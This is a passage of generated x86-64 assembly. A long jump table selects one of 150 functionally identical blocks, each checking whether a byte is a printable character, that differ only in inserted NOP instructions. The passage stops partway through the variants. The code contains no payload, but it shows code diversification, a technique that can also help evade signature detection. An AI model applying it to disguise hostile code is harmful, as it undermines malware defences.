	je	.Lmain_win0_var117
	cmpl	$118, %eax
	je	.Lmain_win0_var118
	cmpl	$119, %eax
	je	.Lmain_win0_var119
	cmpl	$120, %eax
	je	.Lmain_win0_var120
	cmpl	$121, %eax
	je	.Lmain_win0_var121
	cmpl	$122, %eax
	je	.Lmain_win0_var122
	cmpl	$123, %eax
	je	.Lmain_win0_var123
	cmpl	$124, %eax
	je	.Lmain_win0_var124
	cmpl	$125, %eax
	je	.Lmain_win0_var125
	cmpl	$126, %eax
	je	.Lmain_win0_var126
	cmpl	$127, %eax
	je	.Lmain_win0_var127
	cmpl	$128, %eax
	je	.Lmain_win0_var128
	cmpl	$129, %eax
	je	.Lmain_win0_var129
	cmpl	$130, %eax
	je	.Lmain_win0_var130
	cmpl	$131, %eax
	je	.Lmain_win0_var131
	cmpl	$132, %eax
	je	.Lmain_win0_var132
	cmpl	$133, %eax
	je	.Lmain_win0_var133
	cmpl	$134, %eax
	je	.Lmain_win0_var134
	cmpl	$135, %eax
	je	.Lmain_win0_var135
	cmpl	$136, %eax
	je	.Lmain_win0_var136
	cmpl	$137, %eax
	je	.Lmain_win0_var137
	cmpl	$138, %eax
	je	.Lmain_win0_var138
	cmpl	$139, %eax
	je	.Lmain_win0_var139
	cmpl	$140, %eax
	je	.Lmain_win0_var140
	cmpl	$141, %eax
	je	.Lmain_win0_var141
	cmpl	$142, %eax
	je	.Lmain_win0_var142
	cmpl	$143, %eax
	je	.Lmain_win0_var143
	cmpl	$144, %eax
	je	.Lmain_win0_var144
	cmpl	$145, %eax
	je	.Lmain_win0_var145
	cmpl	$146, %eax
	je	.Lmain_win0_var146
	cmpl	$147, %eax
	je	.Lmain_win0_var147
	cmpl	$148, %eax
	je	.Lmain_win0_var148
	cmpl	$149, %eax
	je	.Lmain_win0_var149
	jmp	.Lmain_win0_var0
## Variant 0
.Lmain_win0_var0:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 1
.Lmain_win0_var1:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 2
.Lmain_win0_var2:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 3
.Lmain_win0_var3:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 4
.Lmain_win0_var4:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 5
.Lmain_win0_var5:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 6
.Lmain_win0_var6:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 7
.Lmain_win0_var7:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win0_continue
## Variant 8
.Lmain_win0_var8:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 9
.Lmain_win0_var9:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 10
.Lmain_win0_var10:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 11
.Lmain_win0_var11:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 12
.Lmain_win0_var12:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 13
.Lmain_win0_var13:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 14
.Lmain_win0_var14:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 15
.Lmain_win0_var15:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 16
.Lmain_win0_var16:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 17
.Lmain_win0_var17:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 18
.Lmain_win0_var18:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 19
.Lmain_win0_var19:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 20
.Lmain_win0_var20:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 21
.Lmain_win0_var21:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 22
.Lmain_win0_var22:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 23
.Lmain_win0_var23:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 24
.Lmain_win0_var24:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win0_continue
## Variant 25
.Lmain_win0_var25:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 26
.Lmain_win0_var26:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 27
.Lmain_win0_var27:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 28
.Lmain_win0_var28:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 29
.Lmain_win0_var29:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 30
.Lmain_win0_var30:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 31
.Lmain_win0_var31:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 32
.Lmain_win0_var32:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 33
.Lmain_win0_var33:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 34
.Lmain_win0_var34:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 35
.Lmain_win0_var35:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 36
.Lmain_win0_var36:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 37
.Lmain_win0_var37:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 38
.Lmain_win0_var38:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 39
.Lmain_win0_var39:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win0_continue
## Variant 40
.Lmain_win0_var40:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 41
.Lmain_win0_var41:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 42
.Lmain_win0_var42:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 43
.Lmain_win0_var43:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 44
.Lmain_win0_var44:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 45
.Lmain_win0_var45:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 46
.Lmain_win0_var46:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 47
.Lmain_win0_var47:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 48
.Lmain_win0_var48:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 49
.Lmain_win0_var49:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 50
.Lmain_win0_var50:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 51
.Lmain_win0_var51:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 52
.Lmain_win0_var52:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 53
.Lmain_win0_var53:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 54
.Lmain_win0_var54:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 55
.Lmain_win0_var55:
	popq	%rax
	cmpl	$31, %eax
	nop
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 56
.Lmain_win0_var56:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 57
.Lmain_win0_var57:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 58
.Lmain_win0_var58:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 59
.Lmain_win0_var59:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 60
.Lmain_win0_var60:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 61
.Lmain_win0_var61:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 62
.Lmain_win0_var62:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 63
.Lmain_win0_var63:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 64
.Lmain_win0_var64:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 65
.Lmain_win0_var65:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 66
.Lmain_win0_var66:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 67
.Lmain_win0_var67:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 68
.Lmain_win0_var68:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 69
.Lmain_win0_var69:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
